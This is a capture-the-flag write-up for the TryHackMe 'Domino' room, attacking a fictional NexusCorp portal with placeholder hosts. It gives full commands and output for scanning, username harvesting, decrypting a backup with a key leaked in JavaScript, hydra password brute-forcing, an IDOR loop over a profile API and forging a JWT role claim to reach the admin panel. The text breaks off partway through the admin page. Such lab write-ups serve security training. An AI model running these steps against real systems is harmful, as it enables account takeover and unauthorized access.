# [TryHackMe | Domino](https://tryhackme.com/room/domino) Challenge Room Solution Writeup

### What is the flag found in the admin user's profile notes? 

Begin by scanning `TARGET_IP` with `nmap`.

```bash
root@ip-ATTACKER_IP:~# nmap -sV -sC -p- TARGET_IP
Starting Nmap 7.94SVN ( https://nmap.org ) at 
Nmap scan report for ip-TARGET_IP.ec2.internal (TARGET_IP)
Host is up (0.00039s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4c:5e:c5:27:c5:3c:08:07:54:39:ab:fe:4f:58:b0:f8 (ECDSA)
|_  256 31:92:7e:6d:ad:79:f6:05:4a:1e:e2:f7:87:e0:bd:a9 (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: NexusCorp Portal
|_http-server-header: Apache/2.4.58 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.25 seconds
```

Use `gobuster` to map out the directory structure of the target website. 

```yaml
root@ip-ATTACKER_IP:~# gobuster dir --url http://TARGET_IP/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -r -x html,php,txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://TARGET_IP/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,html,php
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 278]
/.html                (Status: 403) [Size: 278]
/support              (Status: 200) [Size: 861]
/index.php            (Status: 200) [Size: 861]
/admin                (Status: 403) [Size: 322]
/static               (Status: 200) [Size: 1128]
/team.php             (Status: 200) [Size: 3747]
/api                  (Status: 200) [Size: 2]
/javascript           (Status: 403) [Size: 278]
/logout.php           (Status: 200) [Size: 861]
/config.php           (Status: 200) [Size: 0]
/backup               (Status: 200) [Size: 1141]
/forgot.php           (Status: 200) [Size: 684]
/403.php              (Status: 200) [Size: 322]
/auth.php             (Status: 200) [Size: 0]
/dashboard.php        (Status: 200) [Size: 861]
/reset.php            (Status: 200) [Size: 410]
/.php                 (Status: 403) [Size: 278]
/.html                (Status: 403) [Size: 278]
/server-status        (Status: 403) [Size: 278]
/logitech-quickcam_W0QQcatrefZC5QQfbdZ1QQfclZ3QQfposZ95112QQfromZR14QQfrppZ50QQfsclZ1QQfsooZ1QQfsopZ1QQfssZ0QQfstypeZ1QQftrtZ1QQftrvZ1QQftsZ2QQnojsprZyQQpfidZ0QQsaatcZ1QQsacatZQ2d1QQsacqyopZgeQQsacurZ0QQsadisZ200QQsaslopZ1QQsofocusZbsQQsorefinesearchZ1.html (Status: 403) [Size: 278]
Progress: 5095332 / 5095336 (100.00%)
===============================================================
Finished
===============================================================
```

Inspect `index.php` to discover the username format `firstname.lastname`.

```html
root@ip-ATTACKER_IP:~# curl -X GET http://TARGET_IP/index.php 
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>NexusCorp Portal</title>
<link rel="stylesheet" href="/static/style.css">
</head>
<body class="login-page">
<div class="login-box">
  <div class="logo"><span class="logo-icon">&#9650;</span> NexusCorp</div>
  <h2>Employee Portal</h2>
    <form method="POST" action="/index.php">
    <div class="form-group">
      <label>Username</label>
      <input type="text" name="username" placeholder="firstname.lastname" required>
    </div>
    <div class="form-group">
      <label>Password</label>
      <input type="password" name="password" placeholder="Password" required>
    </div>
    <button type="submit" class="btn-primary">Sign In</button>
  </form>
  <div class="links">
    <a href="/forgot.php">Forgot password?</a> - <a href="/team.php">Our Team</a> 
  </div>
</div>
</body>
</html>
```

Try knowningly logging in with wrong credentials to discover the error response of `Invalid credentials`.

```html
root@ip-ATTACKER_IP:~# curl -X POST http://TARGET_IP/index.php -d 'username=test&password=test'
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>NexusCorp Portal</title>
<link rel="stylesheet" href="/static/style.css">
</head>
<body class="login-page">
<div class="login-box">
  <div class="logo"><span class="logo-icon">&#9650;</span> NexusCorp</div>
  <h2>Employee Portal</h2>
  <div class="alert alert-danger">Invalid credentials</div>  <form method="POST" action="/index.php">
    <div class="form-group">
      <label>Username</label>
      <input type="text" name="username" placeholder="firstname.lastname" required>
    </div>
    <div class="form-group">
      <label>Password</label>
      <input type="password" name="password" placeholder="Password" required>
    </div>
    <button type="submit" class="btn-primary">Sign In</button>
  </form>
  <div class="links">
    <a href="/forgot.php">Forgot password?</a> - <a href="/team.php">Our Team</a> 
  </div>
</div>
</body>
</html>
```

Inspect `team.php` to discover employee emails and usernames.

```html
root@ip-ATTACKER_IP:~# curl -X GET http://TARGET_IP/team.php 
<!DOCTYPE html>
<html lang=en>
<head>
<meta charset=UTF-8>
<title>NexusCorp - Our Team</title>
<link rel=stylesheet href=/static/style.css>
<style>
.team-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 1.5rem; margin-top: 2rem; }
.team-card { background: #1a1d2e; border: 1px solid #2d3148; border-radius: 12px; padding: 1.5rem; }
.team-card .avatar { width: 56px; height: 56px; border-radius: 50%; background: #6c63ff; display: flex; align-items: center; justify-content: center; font-size: 1.4rem; font-weight: 700; color: white; margin-bottom: 1rem; }
.team-card h3 { font-size: 1rem; font-weight: 600; color: #e2e8f0; margin-bottom: 0.25rem; }
.team-card .role { font-size: 0.82rem; color: #6c63ff; margin-bottom: 0.5rem; }
.team-card .dept { font-size: 0.8rem; color: #64748b; margin-bottom: 0.75rem; }
.team-card .email { font-size: 0.82rem; color: #94a3b8; font-family: monospace; }
.team-card .email a { color: #94a3b8; text-decoration: none; }
.team-card .email a:hover { color: #6c63ff; }
.page-header { border-bottom: 1px solid #2d3148; padding-bottom: 1rem; margin-bottom: 0.5rem; }
.page-header h1 { font-size: 1.6rem; }
.page-header p { color: #64748b; font-size: 0.9rem; margin-top: 0.4rem; }
</style>
</head>
<body>
<nav class=navbar>
  <div class=nav-brand><span style=color:#6c63ff>&#9650;</span> NexusCorp</div>
  <div class=nav-links>
    <a href=/index.php>Employee Login</a>
    <a href=/team.php style=color:#e2e8f0>Our Team</a>
  </div>
</nav>
<div class=container>
  <div class=page-header>
    <h1>Our Team</h1>
    <p>Meet the people behind NexusCorp's mission to deliver secure, innovative solutions.</p>
  </div>
  <div class=team-grid>

    <div class=team-card>
      <div class=avatar>LH</div>
      <h3>Laura Hayes</h3>
      <div class=role>Chief Information Officer</div>
      <div class=dept>Executive Leadership</div>
      <div class=email><a href=mailto:laura.hayes@nexus.corp>laura.hayes@nexus.corp</a></div>
    </div>

    <div class=team-card>
      <div class=avatar>MC</div>
      <h3>Michael Chen</h3>
      <div class=role>Lead Security Engineer</div>
      <div class=dept>Information Security</div>
      <div class=email><a href=mailto:michael.chen@nexus.corp>michael.chen@nexus.corp</a></div>
    </div>

    <div class=team-card>
      <div class=avatar>SJ</div>
      <h3>Sarah Johnson</h3>
      <div class=role>Senior Software Engineer</div>
      <div class=dept>Engineering</div>
      <div class=email><a href=mailto:sarah.johnson@nexus.corp>sarah.johnson@nexus.corp</a></div>
    </div>

    <div class=team-card>
      <div class=avatar>RW</div>
      <h3>Robert Wilson</h3>
      <div class=role>DevOps Engineer</div>
      <div class=dept>Infrastructure</div>
      <div class=email><a href=mailto:robert.wilson@nexus.corp>robert.wilson@nexus.corp</a></div>
    </div>

    <div class=team-card>
      <div class=avatar>ET</div>
      <h3>Emma Taylor</h3>
      <div class=role>Product Manager</div>
      <div class=dept>Product</div>
      <div class=email><a href=mailto:emma.taylor@nexus.corp>emma.taylor@nexus.corp</a></div>
    </div>

    <div class=team-card>
      <div class=avatar>DB</div>
      <h3>David Brown</h3>
      <div class=role>Full Stack Developer</div>
      <div class=dept>Engineering</div>
      <div class=email><a href=mailto:david.brown@nexus.corp>david.brown@nexus.corp</a></div>
    </div>

    <div class=team-card>
      <div class=avatar>JW</div>
      <h3>James Wright</h3>
      <div class=role>Systems Administrator</div>
      <div class=dept>Infrastructure</div>
      <div class=email><a href=mailto:james.wright@nexus.corp>james.wright@nexus.corp</a></div>
    </div>

  </div>
</div>
</body>
</html>
```

Construct lists of emails and usernames by piping this to `grep`.

```bash
root@ip-ATTACKER_IP:~# curl -sX GET http://TARGET_IP/team.php | grep -Eo '[a-zA-Z]+\.[a-zA-Z]+@nexus\.corp' | sort -u | tee emails.txt | cut -d@ -f1 > usernames.txt
root@ip-ATTACKER_IP:~# cat emails.txt 
david.brown@nexus.corp
emma.taylor@nexus.corp
james.wright@nexus.corp
laura.hayes@nexus.corp
michael.chen@nexus.corp
robert.wilson@nexus.corp
sarah.johnson@nexus.corp
root@ip-ATTACKER_IP:~# cat usernames.txt 
david.brown
emma.taylor
james.wright
laura.hayes
michael.chen
robert.wilson
sarah.johnson
```

Inspect `backup/README.txt` to discover the path to a decryption key reference and `AES-ECB-128` configuration.

```bash
root@ip-ATTACKER_IP:~# curl -X GET http://TARGET_IP/backup/README.txt
NexusCorp Backup Configuration
================================
config.enc  - Encrypted application configuration (AES-128-ECB)
Decryption key reference: see static/app.js (deployment notes)
```

Inspect `static/app.js` to discover the decryption key `N3xusK3y2024!!`, which is padded from 14 to 16 bytes with two `NULL` bytes (`0x00`) according to offset `0x160`.


```properties
root@ip-ATTACKER_IP:~# curl -sX GET http://TARGET_IP/static/app.js | xxd
00000000: 2f2f 204e 6578 7573 436f 7270 2050 6f72  // NexusCorp Por
00000010: 7461 6c20 2d20 4672 6f6e 7465 6e64 2055  tal - Frontend U
00000020: 7469 6c69 7469 6573 0a2f 2f20 7632 2e33  tilities.// v2.3
00000030: 2e31 202d 2042 7569 6c64 2032 3032 3431  .1 - Build 20241
00000040: 3131 350a 0a28 6675 6e63 7469 6f6e 2829  115..(function()
00000050: 207b 0a20 2020 2027 7573 6520 7374 7269   {.    'use stri
00000060: 6374 273b 0a0a 2020 2020 2f2f 2043 6f6e  ct';..    // Con
00000070: 6669 6775 7261 7469 6f6e 2028 544f 444f  figuration (TODO
00000080: 3a20 6d6f 7665 2074 6f20 656e 7620 6265  : move to env be
00000090: 666f 7265 2070 726f 6420 6465 706c 6f79  fore prod deploy
000000a0: 6d65 6e74 202d 206c 6175 7261 2032 3032  ment - laura 202
000000b0: 342d 3130 2d32 3229 0a20 2020 2063 6f6e  4-10-22).    con
000000c0: 7374 2043 4f4e 4649 4720 3d20 7b0a 2020  st CONFIG = {.  
000000d0: 2020 2020 2020 6170 6942 6173 653a 2027        apiBase: '
000000e0: 2f61 7069 272c 0a20 2020 2020 2020 202f  /api',.        /
000000f0: 2f20 456e 6372 7970 7469 6f6e 206b 6579  / Encryption key
00000100: 2066 6f72 2062 6163 6b75 7020 636f 6e66   for backup conf
00000110: 6967 2064 6563 7279 7074 696f 6e20 2d20  ig decryption - 
00000120: 4145 532d 4543 422d 3132 380a 2020 2020  AES-ECB-128.    
00000130: 2020 2020 2f2f 204b 6579 3a20 4e33 7875      // Key: N3xu
00000140: 734b 3379 3230 3234 2121 2020 2870 6164  sK3y2024!!  (pad
00000150: 2074 6f20 3136 2062 7974 6573 2077 6974   to 16 bytes wit
00000160: 6820 0029 0a20 2020 2020 2020 205f 6261  h .).        _ba
00000170: 636b 7570 4b65 793a 2027 4e33 7875 734b  ckupKey: 'N3xusK
00000180: 3379 3230 3234 2121 272c 0a20 2020 2020  3y2024!!',.     
00000190: 2020 2061 7070 5665 7273 696f 6e3a 2027     appVersion: '
000001a0: 322e 332e 3127 0a20 2020 207d 3b0a 0a20  2.3.1'.    };.. 
000001b0: 2020 202f 2f20 5365 7373 696f 6e20 6865     // Session he
000001c0: 6c70 6572 0a20 2020 2077 696e 646f 772e  lper.    window.
000001d0: 4e65 7875 7341 7070 203d 207b 0a20 2020  NexusApp = {.   
000001e0: 2020 2020 2067 6574 5365 7373 696f 6e3a       getSession:
000001f0: 2066 756e 6374 696f 6e28 2920 7b0a 2020   function() {.  
00000200: 2020 2020 2020 2020 2020 636f 6e73 7420            const 
00000210: 636f 6f6b 6965 203d 2064 6f63 756d 656e  cookie = documen
00000220: 742e 636f 6f6b 6965 2e73 706c 6974 2827  t.cookie.split('
00000230: 3b27 292e 6669 6e64 2863 203d 3e20 632e  ;').find(c => c.
00000240: 7472 696d 2829 2e73 7461 7274 7357 6974  trim().startsWit
00000250: 6828 276e 6578 7573 5f73 6573 7369 6f6e  h('nexus_session
00000260: 3d27 2929 3b0a 2020 2020 2020 2020 2020  ='));.          
00000270: 2020 6966 2028 2163 6f6f 6b69 6529 2072    if (!cookie) r
00000280: 6574 7572 6e20 6e75 6c6c 3b0a 2020 2020  eturn null;.    
00000290: 2020 2020 2020 2020 7472 7920 7b0a 2020          try {.  
000002a0: 2020 2020 2020 2020 2020 2020 2020 7265                re
000002b0: 7475 726e 204a 534f 4e2e 7061 7273 6528  turn JSON.parse(
000002c0: 6174 6f62 2863 6f6f 6b69 652e 7370 6c69  atob(cookie.spli
000002d0: 7428 273d 2729 5b31 5d2e 7472 696d 2829  t('=')[1].trim()
000002e0: 2929 3b0a 2020 2020 2020 2020 2020 2020  ));.            
000002f0: 7d20 6361 7463 6828 6529 207b 2072 6574  } catch(e) { ret
00000300: 7572 6e20 6e75 6c6c 3b20 7d0a 2020 2020  urn null; }.    
00000310: 2020 2020 7d2c 0a20 2020 2020 2020 2067      },.        g
00000320: 6574 4170 6954 6f6b 656e 3a20 6675 6e63  etApiToken: func
00000330: 7469 6f6e 2829 207b 0a20 2020 2020 2020  tion() {.       
00000340: 2020 2020 2072 6574 7572 6e20 6c6f 6361       return loca
00000350: 6c53 746f 7261 6765 2e67 6574 4974 656d  lStorage.getItem
00000360: 2827 6e65 7875 735f 6a77 7427 293b 0a20  ('nexus_jwt');. 
00000370: 2020 2020 2020 207d 2c0a 2020 2020 2020         },.      
00000380: 2020 7365 7441 7069 546f 6b65 6e3a 2066    setApiToken: f
00000390: 756e 6374 696f 6e28 746f 6b65 6e29 207b  unction(token) {
000003a0: 0a20 2020 2020 2020 2020 2020 206c 6f63  .            loc
000003b0: 616c 5374 6f72 6167 652e 7365 7449 7465  alStorage.setIte
000003c0: 6d28 276e 6578 7573 5f6a 7774 272c 2074  m('nexus_jwt', t
000003d0: 6f6b 656e 293b 0a20 2020 2020 2020 207d  oken);.        }
000003e0: 0a20 2020 207d 3b0a 0a20 2020 202f 2f20  .    };..    // 
000003f0: 4175 746f 2d66 6574 6368 204a 5754 2069  Auto-fetch JWT i
00000400: 6620 6e6f 7420 6361 6368 6564 0a20 2020  f not cached.   
00000410: 2069 6620 2821 6c6f 6361 6c53 746f 7261   if (!localStora
00000420: 6765 2e67 6574 4974 656d 2827 6e65 7875  ge.getItem('nexu
00000430: 735f 6a77 7427 2920 2626 2064 6f63 756d  s_jwt') && docum
00000440: 656e 742e 636f 6f6b 6965 2e69 6e63 6c75  ent.cookie.inclu
00000450: 6465 7328 276e 6578 7573 5f73 6573 7369  des('nexus_sessi
00000460: 6f6e 2729 2920 7b0a 2020 2020 2020 2020  on')) {.        
00000470: 6665 7463 6828 272f 6170 692f 6175 7468  fetch('/api/auth
00000480: 2f74 6f6b 656e 2e70 6870 272c 207b 6372  /token.php', {cr
00000490: 6564 656e 7469 616c 733a 2027 696e 636c  edentials: 'incl
000004a0: 7564 6527 7d29 0a20 2020 2020 2020 2020  ude'}).         
000004b0: 2020 202e 7468 656e 2872 203d 3e20 722e     .then(r => r.
000004c0: 6a73 6f6e 2829 290a 2020 2020 2020 2020  json()).        
000004d0: 2020 2020 2e74 6865 6e28 6420 3d3e 207b      .then(d => {
000004e0: 2069 6620 2864 2e74 6f6b 656e 2920 6c6f   if (d.token) lo
000004f0: 6361 6c53 746f 7261 6765 2e73 6574 4974  calStorage.setIt
00000500: 656d 2827 6e65 7875 735f 6a77 7427 2c20  em('nexus_jwt', 
00000510: 642e 746f 6b65 6e29 3b20 7d29 0a20 2020  d.token); }).   
00000520: 2020 2020 2020 2020 202e 6361 7463 6828           .catch(
00000530: 2829 203d 3e20 7b7d 293b 0a20 2020 207d  () => {});.    }
00000540: 0a7d 2928 293b 0a                        .})();.
```

Decrypt `/backup.config.enc` using this key to discover a system username `devops`, then add it to `emails.txt` and `usernames.txt`. 

```bash
root@ip-ATTACKER_IP:~# curl -sX GET http://TARGET_IP/backup/config.enc | openssl enc -d -aes-128-ecb -K "$(printf 'N3xusK3y2024!!\x00\x00' | xxd -p -c 256)" -nosalt -out decrypted.txt
root@ip-ATTACKER_IP:~# cat decrypted.txt 
{"app_name":"NexusCorp Portal","version":"2.3.1","deploy_env":"production","system_user":"devops"}
root@ip-ATTACKER_IP:~# sed -i '1i devops@nexus.corp' emails.txt && sed -i '1i devops' usernames.txt
root@ip-ATTACKER_IP:~# cat emails.txt 
devops@nexus.corp
david.brown@nexus.corp
emma.taylor@nexus.corp
james.wright@nexus.corp
laura.hayes@nexus.corp
michael.chen@nexus.corp
robert.wilson@nexus.corp
sarah.johnson@nexus.corp
root@ip-ATTACKER_IP:~# cat usernames.txt 
devops
david.brown
emma.taylor
james.wright
laura.hayes
michael.chen
robert.wilson
sarah.johnson
```

Use all of this information in `hydra` to brute-force the passwords for the discovered users.

```bash
root@ip-ATTACKER_IP:~# hydra -L usernames.txt -P /usr/share/wordlists/rockyou.txt TARGET_IP http-post-form '/index.php:username=^USER^&password=^PASS^:F=Invalid credentials' -t 16
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-11-09 12:38:39
[DATA] max 16 tasks per 1 server, overall 16 tasks, 114755184 login tries (l:8/p:14344398), ~7172199 tries per task
[DATA] attacking http-post-form://TARGET_IP:80/index.php:username=^USER^&password=^PASS^:F=Invalid credentials
[STATUS] 4503.00 tries/min, 4503 tries in 00:01h, 114750681 to do in 424:44h, 16 active
[80][http-post-form] host: TARGET_IP   login: devops
[STATUS] 4782331.00 tries/min, 14346993 tries in 00:03h, 100408191 to do in 00:21h, 16 active
[80][http-post-form] host: TARGET_IP   login: david.brown
[80][http-post-form] host: TARGET_IP   login: emma.taylor   password: password
[STATUS] 6148047.57 tries/min, 43036333 tries in 00:07h, 71718851 to do in 00:12h, 16 active
[80][http-post-form] host: TARGET_IP   login: james.wright
[80][http-post-form] host: TARGET_IP   login: laura.hayes
[STATUS] 5976854.00 tries/min, 71722248 tries in 00:12h, 43032936 to do in 00:08h, 16 active
[80][http-post-form] host: TARGET_IP   login: michael.chen
[80][http-post-form] host: TARGET_IP   login: robert.wilson   password: password
[80][http-post-form] host: TARGET_IP   login: sarah.johnson   password: password
1 of 1 target successfully completed, 8 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-11-09 12:54:07
```

Ignoring false-positives from empty password attempts, `username=emma.taylor&password=password` (Product Manager), `username=robert.wilson&password=password` (DevOps Engineer), and `username=sarah.johnson&password=password` (Senior Software Engineer) are all valid credential pairs. Based off of their roles, the latter two are more likely to possess elevated privileges. Try logging in as `robert.wilson` and make sure to save his session cookie.

```html
root@ip-ATTACKER_IP:~# curl -c cookies.txt -b cookies.txt -iLX POST http://TARGET_IP/index.php -d 'username=robert.wilson&password=password'
HTTP/1.1 302 Found
Date: Mon, 09 Nov 2026 13:15:22 GMT
Server: Apache/2.4.58 (Ubuntu)
Set-Cookie: nexus_session=eyJ1c2VyX2lkIjo0LCJ1c2VybmFtZSI6InJvYmVydC53aWxzb24iLCJyb2xlIjoidXNlciJ9.06633788837d4525fc57614def8718cf061a8374b95120eb93aedfd74eb4cee3; path=/
Location: /dashboard.php
Content-Length: 0
Content-Type: text/html; charset=UTF-8

HTTP/1.1 200 OK
Date: Mon, 09 Nov 2026 13:15:22 GMT
Server: Apache/2.4.58 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 1346
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Dashboard - NexusCorp</title>
<link rel="stylesheet" href="/static/style.css">
</head>
<body>
<nav class="navbar">
  <div class="nav-brand"><span class="logo-icon">&#9650;</span> NexusCorp</div>
  <div class="nav-links">
    <a href="/dashboard.php">Dashboard</a>
    <a href="/support/index.php">Support</a>
        <a href="/logout.php">Logout</a>
  </div>
</nav>
<div class="container">
  <h1>Welcome, robert.wilson</h1>
  <div class="card-grid">
    <div class="card">
      <h3>My Profile</h3>
      <p><strong>Username:</strong> robert.wilson</p>
      <p><strong>Email:</strong> robert.wilson@nexus.corp</p>
      <p><strong>Role:</strong> user</p>
    </div>
    <div class="card">
      <h3>File Viewer</h3>
      <p>Access internal documents via the secure file API.</p>
      <p><small>Endpoint: <code>/api/files.php?name=</code></small></p>
      <p><small>Requires JWT authentication via <code>/api/auth/token.php</code></small></p>
    </div>
    <div class="card">
      <h3>Quick Links</h3>
      <ul>
        <li><a href="/support/index.php">Support Tickets</a></li>
        <li><a href="/support/create.php">Open Ticket</a></li>
        <li><a href="/api/users/profile.php?id=4">My Profile API</a></li>
      </ul>
    </div>
  </div>
</div>
</body>
</html>
root@ip-ATTACKER_IP:~# SESSION=$(awk '$6 == "nexus_session" {print $7}' cookies.txt)
root@ip-ATTACKER_IP:~# echo $SESSION
eyJ1c2VyX2lkIjo0LCJ1c2VybmFtZSI6InJvYmVydC53aWxzb24iLCJyb2xlIjoidXNlciJ9.06633788837d4525fc57614def8718cf061a8374b95120eb93aedfd74eb4cee3
```

Having discovered a potential IDOR vulnerability in `/api/users/profile.php?id=x`, try iterating this variable.

```bash
root@ip-ATTACKER_IP:~# for x in $(seq -1 $(wc -l <usernames.txt)); do curl -s -X GET -b cookies.txt "http://TARGET_IP/api/users/profile.php?id=$x"; echo; done
{"error":"User not found"}
{"error":"Missing id"}
{"id":1,"username":"laura.hayes","email":"laura.hayes@nexus.corp","role":"admin","notes":"THM{1d0r_h0r1z0nt4l_4cc3ss_fl4g1}"}
{"id":2,"username":"michael.chen","email":"michael.chen@nexus.corp","role":"user","notes":""}
{"id":3,"username":"sarah.johnson","email":"sarah.johnson@nexus.corp","role":"user","notes":""}
{"id":4,"username":"robert.wilson","email":"robert.wilson@nexus.corp","role":"user","notes":""}
{"id":5,"username":"emma.taylor","email":"emma.taylor@nexus.corp","role":"user","notes":"Q3 migration notes: infra review pending approval"}
{"id":6,"username":"david.brown","email":"david.brown@nexus.corp","role":"user","notes":""}
{"id":7,"username":"james.wright","email":"james.wright@nexus.corp","role":"user","notes":""}
{"error":"User not found"}
```

The captured flag is **THM{1d0r_h0r1z0nt4l_4cc3ss_fl4g1}**.

### What is the flag displayed on the admin panel after gaining admin access?

From earlier, the first part of the session cookie appears to be `Base64`-encoded, try decoding it.

```bash
root@ip-ATTACKER_IP:~# echo $SESSION | cut -d '.' -f1 | base64 -d
{"user_id":4,"username":"robert.wilson","role":"user"}
```

This is a similar format to the data returned by the earlier IDOR vulnerability. However, modifying parameters such as `role` from `user` to `admin` (as observed with `laura.hayes`) will invalidate the cookie's signature, causing the server to reject the modified cookie. Therefore, simply altering the encoded payload is insufficient to gain elevated privileges (this can be verified by testing the method). Further investigation would require identifying the signing algorithm and obtaining or discovering the signing secret.

#### Path 1: JWT Token Forgery

Requests to `/admin/` return identical `403 Forbidden` responses, regardless of whether the user is authenticated.

```html
root@ip-ATTACKER_IP:~# curl -iX GET http://TARGET_IP/admin/
HTTP/1.1 403 Forbidden
Date: Mon, 09 Nov 2026 14:38:30 GMT
Server: Apache/2.4.58 (Ubuntu)
Content-Length: 322
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html><head><title>403 - NexusCorp</title><link rel="stylesheet" href="/static/style.css"></head>
<body class="login-page">
<div class="login-box">
<h2>403 - Access Denied</h2>
<p>You do not have permission to access this resource.</p>
<a href="/dashboard.php">Return to Dashboard</a>
</div></body></html>
root@ip-ATTACKER_IP:~# curl -b cookies.txt -iX GET http://TARGET_IP/admin/
HTTP/1.1 403 Forbidden
Date: Mon, 09 Nov 2026 14:38:40 GMT
Server: Apache/2.4.58 (Ubuntu)
Content-Length: 322
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html><head><title>403 - NexusCorp</title><link rel="stylesheet" href="/static/style.css"></head>
<body class="login-page">
<div class="login-box">
<h2>403 - Access Denied</h2>
<p>You do not have permission to access this resource.</p>
<a href="/dashboard.php">Return to Dashboard</a>
</div></body></html>
```

`dashboard.php` revealed that the File Viewer API uses JWT authentication as a secondary authentication mechanism. Obtain a token from `/api/auth/token.php` using the authenticated session cookie.

```bash
root@ip-ATTACKER_IP:~# curl -b cookies.txt -X GET http://TARGET_IP/api/auth/token.php
{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJyb2JlcnQud2lsc29uIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3OTQyMzg2MzQsImV4cCI6MTc5NDI0MjIzNH0.uzYgfwUVEhQELb3wcKJqH\/HaIxxxccFgWZbEA7IcPIc","expires_in":3600,"note":"Use this token as: Authorization: Bearer <token> for \/api\/files.php"} 
root@ip-ATTACKER_IP:~# TOKEN=$(curl -b cookies.txt -sX GET http://TARGET_IP/api/auth/token.php | jq -r '.token')
root@ip-ATTACKER_IP:~# echo $TOKEN
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJyb2JlcnQud2lsc29uIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3OTQyMzg2NTcsImV4cCI6MTc5NDI0MjI1N30.O2pPACRzvOOMqzDipuhWNNSrKwMLQRusT5OBSXS7+cw
```

Including the token reveals a `Vary: Authorization` header in the response from `/admin/`, suggesting that the server may handle requests differently depending on the presence or value of an Authorization header.

```html
root@ip-ATTACKER_IP:~# curl -b cookies.txt -H "Authorization: Bearer $TOKEN" -iX GET http://TARGET_IP/admin/
HTTP/1.1 403 Forbidden
Date: Mon, 09 Nov 2026 14:43:17 GMT
Server: Apache/2.4.58 (Ubuntu)
Vary: Authorization
Content-Length: 322
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html><head><title>403 - NexusCorp</title><link rel="stylesheet" href="/static/style.css"></head>
<body class="login-page">
<div class="login-box">
<h2>403 - Access Denied</h2>
<p>You do not have permission to access this resource.</p>
<a href="/dashboard.php">Return to Dashboard</a>
</div></body></html>
```

Decode the JWT's header and payload from `Base64` to inspect its claims. 

```bash
root@ip-ATTACKER_IP:~# echo $TOKEN | cut -d '.' -f1 | base64 -d
{"alg":"HS256","typ":"JWT"}
root@ip-ATTACKER_IP:~# echo $TOKEN | cut -d '.' -f2 | base64 -d
{"sub":"robert.wilson","role":"user","iat":1794233864,"exp":1794237464}
```

The payload contains a `role` claim, currently set to `user`. Since the JWT is separate from the session cookie, modifying it does not terminate the underlying web session. Change the `role` claim to `admin`, then test the modified token against `/admin/` to determine whether the endpoint accepts the altered credentials. Note that changing the payload without regenerating a valid signature *should* cause JWT verification to fail; in this case, XSS via `support/create.php` would be tested next (which the flag indicates was the intended method anyways).

```html
root@ip-ATTACKER_IP:~# ADMINTOKEN=$(echo $TOKEN | cut -d '.' -f1).$(echo $TOKEN | cut -d '.' -f2 | base64 -d | sed 's/"role":"user"/"role":"admin"/' | base64 -w 0 | tr '+/' '-_' | tr -d '=').$(echo $TOKEN | cut -d '.' -f3)
root@ip-ATTACKER_IP:~# echo $ADMINTOKEN
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJyb2JlcnQud2lsc29uIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzk0MjM5OTc0LCJleHAiOjE3OTQyNDM1NzR9.GlhhrlRcKJkwz4n7h7UPA1HAYR+Od5tMpxYHjEaxsIM
root@ip-ATTACKER_IP:~# curl -b cookies.txt -H "Authorization: Bearer $ADMINTOKEN" -iX GET http://TARGET_IP/admin/
HTTP/1.1 200 OK
Date: Mon, 09 Nov 2026 16:04:44 GMT
Server: Apache/2.4.58 (Ubuntu)
Vary: Authorization,Accept-Encoding
Content-Length: 1317
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Admin Panel - NexusCorp</title>
<link rel="stylesheet" href="/static/style.css">
</head>
<body>
<nav class="navbar">
  <div class="nav-brand"><span class="logo-icon">&#9650;</span> NexusCorp Admin</div>
  <div class="nav-links">
    <a href="/dashboard.php">Portal</a>
    <a href="/logout.php">Logout</a>
  </div>
</nav>
<div class="container">
  <div class="admin-header">
    <h1>Administration Console</h1>
    <p>Logged in as: <strong>robert.wilson</strong></p>
  </div>
  <div class="flag-box">
    <h3>System Status</h3>
    <p>Internal reference: <code>THM{bl1nd_x55_s3ss10n_h1j4ck_fl4g2}</code></p>
  </div>
  <div class="card-grid">
    <div class="card">
      <h3>User Management</h3>
      <p>Manage employee accounts and permissions.</p>
      <a href="/api/users/profile.php?id=1" class="btn-secondary">View User API</a>
    </div>
    <div class="card">
      <h3>File System Access</h3>
      <p>Internal document viewer via authenticated API.</p>
      <p><small>GET /api/files.php?name=[path] with Bearer token</small></p>
    </div>
    <div class="card">
      <h3>Support Queue</h3>
      <p>Pending tickets requiring admin review.</p>
